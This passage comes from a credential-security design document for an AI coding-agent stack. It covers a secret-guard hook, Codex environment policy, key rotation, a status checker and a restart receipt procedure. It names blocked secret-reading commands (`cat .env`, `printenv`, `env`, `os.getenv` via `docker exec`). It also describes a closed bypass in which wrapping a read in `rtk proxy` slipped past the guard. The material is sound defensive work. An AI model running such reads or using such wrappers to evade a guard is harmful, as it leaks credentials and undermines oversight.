  "$OH_SESSION_API_KEYS_0"'`, or `docker exec <server> python3 -c` code that
  calls `os.getenv` with the name), but not `printenv`, `env` or `docker
  inspect`, and it would refuse plain code searches of the name (`rg
  OH_SESSION_API_KEYS_0`), which the runtime worker's code and this page
  contain.

A search whose pattern is given through `-e` or a long option the guard does
not model (`rg --fixed-strings 'runtime-workers/openhands/secrets' docs`) is
read as a search of that path and blocked. That is the parser's existing
behaviour for every store (`rg -e .ssh/ docs` blocks too); a positional
pattern (`rg -n 'runtime-workers/openhands/secrets' docs`) passes.

Since 2026-09-27 every rule of the guard also reads the command an `rtk`
invocation runs. The guard runs beside RTK's Claude hook and sees the
command as Claude wrote it (matching hooks run in parallel and a deny
wins, [hooks](https://code.claude.com/docs/en/hooks)), so a typed `cat F`
was always caught; but agents also write rtk forms themselves, such as a
re-run as `rtk proxy <command>`, and before this change `rtk proxy cat
.env` passed every reader rule. `proxy`, `summary`, `err` and `test` run
the command after them, `run` hands its command to `sh -c`, `read`,
`smart`, `json` and `log` read their files, and any other subcommand runs
the program of the same name, so `rtk env` counts as an environment dump
(`rtk --help`, rtk 0.50.0).

### Codex

Stop credential and broker variables from reaching Codex shells with an
empty inherited environment plus explicit, non-secret `set` entries. In
`~/.codex/config.toml`:

```toml
[shell_environment_policy]
inherit = "none"

[shell_environment_policy.set]
# Only what Codex shells need. Never put a credential here.
PATH = "/usr/local/bin:/usr/bin:/bin"   # keep your existing PATH entry
HOME = "/home/example"   # your home directory
RTK_TELEMETRY_DISABLED = "1"
```

Add any other non-secret variable a tool in those shells needs (for example
`LANG`, `TERM` or `TMPDIR`). The official Codex configuration reference
(<https://developers.openai.com/codex/config-reference>, fetched 2026-09-24)
documents `inherit` as `all`, `core` or `none`, `set` as "explicit
environment values injected after exclusions", and `ignore_default_excludes`
as `true` by default, which keeps variables whose names contain `KEY`,
`SECRET` or `TOKEN`.

This choice rests on the repository's own measurement on codex-cli 0.155.1
([`blueprints/gap-wave2-20260923/us-equities__security-supply-chain/write_receipts.py`](../blueprints/gap-wave2-20260923/us-equities__security-supply-chain/write_receipts.py)
lines 181-187, canary values in the launcher environment, `codex sandbox`):
with `inherit = "none"` no broker variable reached the shell and no process
environment held the canary; the default policy passed all 12 names; and
`ignore_default_excludes = false` still passed `TWS_*`, `IBKR_ACCOUNT_ID`,
`ALPACA_PAPER*`, `ALPACA_ACCOUNT_PROFILE` and `APCA_API_BASE_URL`.
`inherit = "core"` is documented but **unmeasured** here; do not rely on it
without rerunning that canary probe (`worker_env_check.sh` and the B-arm
method). `credential_status.py --client-guards` counts only
`inherit = "none"` as guarded.

This setting controls **environment inheritance, not file reads**. A Codex
shell runs as your user and can still read a credential file, for example
`cat` on the store. The file-level mitigations are the store's location
outside every workspace, so no project checkout contains it, plus the Codex
sandbox; this setting adds nothing there. With the storage rules above, no
credential variable should be in the launcher environment in the first
place.

## Rotation and incidents

Rotate immediately when any of these happens: a gitleaks, push-protection or
secret-scanning alert; the checker reports mode, owner or location drift; a
value appears in a transcript, log, receipt, telemetry or agent context,
including a key pasted into a prompt or passed through a tool call; a host is
lost or retired; a collaborator or device changes. Rotate the Alpaca
paper pair once after adopting this layout, because broker-prefixed variable
names were seen in a launcher environment on 2026-09-23. Paid keys (Databento,
Typesafe) rotate quarterly. The checker flags files older than 90 days as
information only, not as a failure.

To rotate a file-based secret:

1. Regenerate the key at the provider, which invalidates the old one.
2. Write the new file next to the old one, then move it into place:
   `install -m 600 <template> "$d/<name>.env.new"`, edit it, then
   `mv "$d/<name>.env.new" "$d/<name>.env"`.
3. Run `scripts/credential_status.py` and a paper connectivity check.

To rotate the other kinds:

- **Grafana:** delete its env file, rerun
  `observability/backends/configure.py`, then restart the unit.
- **Native sign-ins:** `/logout` in Claude Code, `codex logout` then
  `codex login --device-auth`, or `gh auth refresh`. Revoke stale tokens and
  OAuth apps in GitHub settings. For Hugging Face, delete or refresh the
  host's token at <https://huggingface.co/settings/tokens>, then run
  `hf auth logout` and `hf auth login` in your own terminal.
- **Actions secret:** run `gh secret set FOUNDATION_RESTORE_FIXTURE_20260920`
  from your own terminal.

If a value reaches GitHub or any store that keeps output:

1. Rotate first. Rewriting history does not undo exposure on a public
   repository.
2. Purge or quarantine the copies: the transcript files, RTK recall entries,
   context-mode knowledge base, ai-memory observations and telemetry that
   hold it.
3. Clean up history if needed.
4. Report it through the private advisory flow in
   [`SECURITY.md`](../SECURITY.md), never in a public issue.

## Checker

```sh
python3 scripts/credential_status.py            # text
python3 scripts/credential_status.py --json     # machine-readable
python3 scripts/credential_status.py --client-guards   # also check the user-level guard keys
```

The checker uses `lstat` only and never opens a credential file. For each
entry it reports existence, type, mode, owner, directory mode, whether the
file is inside a worktree or tracked by Git, and the file's age. It also
reports:

- secret variable names that are set in the current environment, names only;
- native store path overrides that are set (`HF_TOKEN_PATH`), names only; each
  affected row also gets the warning `store_path_overridden`, because it then
  inspects a path the tool no longer uses;
- tracked files with credential-shaped basenames;
- whether `core.hooksPath` points at `scripts/git-hooks`;
- whether gitleaks is on `PATH`;
- whether the project guard file exists;
- a `kernel_keyring` row as `unchecked`, with persistence `memory_only` and
  the warning `memory_only_lost_on_restart`, because the next kernel restart
  erases it. A required `kernel_keyring` row is an inventory error (exit 2),
  since a required key must survive a restart;
- names in the store directory that no row claims (`undeclared_store_file`),
  such as a stray file or the temporary file of an interrupted write. This
  is one directory listing: no file is opened, and a symlinked store
  directory is not listed through;
- live `user` keys of your uid described `native-agent-stack:<name>` in
  `/proc/keys` whose `<name>` no `kernel_keyring` row declares
  (`undeclared_keyring_key`, Linux only). `<name>` is the whole rest of the
  description, `/` and `:` included, and only a `key_name` equal to it
  declares a key. That file shows each key's description and payload length,
  never its value; revoked, invalidated or expired keys are skipped.

Both coverage lists are names only and are warnings, never a failure.
Together with the rows they account for every file directly in the store
directory and every live key of your uid under this stack's keyring prefix.

`--client-guards` parses `~/.claude/settings.json` and `~/.codex/config.toml`
and reports only booleans: user deny rules for the store, the user secret-guard
hook (registered and installed), the Claude sandbox, whether Claude Code
telemetry logs content (`claude_telemetry_logs_content`, plus one boolean per
flag; key names and truthiness only), and whether Codex uses
`inherit = "none"`. The exit status is 1 when any credential file that
exists is unsafe, whatever the entry's status, so a group-readable Hugging
Face token fails the check as a broker key does. It is 2 for an invalid
inventory. Missing files and warnings are informational.

## Restart check (2026-09-29)

A kernel restart erases the kernel keyring and must leave every key file of
the store as it was. `scripts/credential_boot_receipt.py` shows whether it
did, without a value and without a person present. The
`credential-boot-receipt.service` oneshot runs `record` at every start of the
user's service manager: with linger on, that is every boot (on WSL, every
distro start), with no login and no unlock. Each receipt is a 0600 file in
the 0700 directory
`${XDG_STATE_HOME:-$HOME/.local/state}/native-agent-stack/credential-boot/`,
named `<sequence>-<UTC stamp>-<boot id prefix>.json`; `compare` orders
receipts by the sequence number, never by the clock, which can step back on
WSL. It holds the boot id, uptime, systemd version, linger, the checkout revision,
the checker's rows (states, findings, warnings and path templates), each file
row's `lstat` mode, size and mtime_ns, the checker's coverage names, the names
of live `native-agent-stack:*` kernel keys, and `claude_user_guard_matches_pin`
(the installed user-scope guard's sha256 against its line in
`adoption/hooks/claude/SHA256SUMS`, also reported by
`credential_status.py --client-guards`). No store file is opened and no
content hash is kept. `compare` prints states and the names of changed
fingerprint fields, never their values. Publish its output, never a raw
receipt: the size of a one-variable file gives its value's length. The paper
units keep `--env-file "$PAPER_ENV_FILE"` (and `"$PAPER_ENV_FILE_2"`); this
check does not change them.

Before the restart, once this change is merged, the coordinator runs these
host writes, announced to the peers first:

1. Fast-forward the live clone, render and install the unit, and enable it:

   ```sh
   cd ~/code/native-agent-stack-live
   git fetch origin main
   git merge --ff-only origin/main
   sed 's#@REPOSITORY@#%h/code/native-agent-stack-live#g' adoption/templates/systemd/credential-boot-receipt.service > ~/.config/systemd/user/credential-boot-receipt.service
   systemd-analyze --user verify ~/.config/systemd/user/credential-boot-receipt.service
   systemctl --user daemon-reload
   systemctl --user enable credential-boot-receipt.service
   ```

   The merge fast-forwards, `verify` prints nothing and exits 0, and `enable`
   prints one `Created symlink` line into `default.target.wants`.
2. Smoke-run the unit, which writes the baseline receipt R0, and read it back:

   ```sh
   systemctl --user start credential-boot-receipt.service
   journalctl --user -u credential-boot-receipt.service -n 20 -o cat --grep='^credential boot receipt:'
   python3 -I scripts/credential_boot_receipt.py compare
   ```

   `start` exits 0. `-u` also shows systemd's own messages about the unit,
   such as `Finished credential-boot-receipt.service - ...`, so `--grep`
   selects the tool's lines; with `-n` it implies `--reverse`, so the first
   line is the newest and reads `credential boot receipt: rows=<n> ok=<n> ...
   guard_matches_pin=true result=ok receipt=<name>.json`. `compare` prints
   `baseline: <name> (one receipt; nothing to compare yet)` and exits 0.
3. If a canary harness from a later change of this design has landed, keep its
   canary across the restart as that change documents.
4. Checkpoint the peers (the grand-dashboard checkpoint). The restart is the
   user's: once the trading lane has confirmed a time, the user runs
   `wsl --shutdown` from Windows. No agent restarts its own host.

After the restart:

5. The oneshot has written R1 at the distro start. In the first session, from
   the live clone:

   ```sh
   python3 -I scripts/credential_boot_receipt.py compare
   ```

   Expected, exit 0: `boot_id: changed`; every file row
   `ok -> ok, fingerprint same`, the `tavily` row included (from its file);
   `kernel keyring names: <names> -> none (memory only: a kernel restart erases
   them)`; `claude_user_guard_matches_pin: true -> true`; `result: ok`. Exit 1
   ends with `result: regression: <ids>`, naming each required or optional file
   row that was `ok` and is not; exit 2 means no receipt could be read or one
   is malformed, and its one line names the receipt file.
6. If a canary was kept, consume, verify and clean it up with that harness: it
   shows a stored key injected by id after a restart with no person involved.
7. Publish sanitized, value-free output with host paths stripped, in a
   follow-up evidence PR: `compare`'s lines, not the receipts.

## Follow-ups not in this change

- A shared loader (`load_private_env`) whose `--env-file` defaults to the
  conventional path. `runner.credentials` and `market_research.credentials`
  would delegate to it. Delegating changes behaviour: `runner.credentials`
  resolves symlinks today, and `O_NOFOLLOW` would refuse them. That change
  must be tested and documented when it lands.
- Move the environment-only consumers above to it (item A1), together with
  the lane that owns them, and replace `${ENV_FILE:?}` in
  `adaptive-paper/scheduled_trial.sh` with a default.
- A gitleaks rule keyed on the Alpaca variable names, plus a rule on the
  key's shape once that format is checked against Alpaca's own documentation.
- A measured Claude Code sandbox profile (`sandbox.enabled`,
  `allowUnsandboxedCommands: false`, `credentials.files` deny for the store,
  and the network allowlist the runners need). The measurement must include a
  check that sandboxed commands cannot reach the user systemd bus
  (`systemd-run --user`).
